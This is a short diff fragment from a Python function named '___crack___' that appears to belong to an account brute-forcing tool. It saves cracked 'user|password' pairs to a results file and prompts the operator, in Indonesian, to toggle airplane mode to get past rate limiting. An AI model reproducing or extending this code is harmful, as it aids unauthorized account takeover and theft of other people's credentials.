@@ -468,7 +468,7 @@ def ___crack___(total,user,pwx):
                 open('Results/Cp.txt','a').write("%s|%s\n"%(user,pw))
                 break
                 continue
-            elif 'Please wait' in str(req) or 'Try Again Later' in str(req):
+            elif 'Please wait' in str(req):
                 sys.stdout.write(
                     "\r%s[%s!%s]%s Gunakan Mode Pesawat 2 Detik"%(P,M,P,M)),
                 sys.stdout.flush();sleep(7)
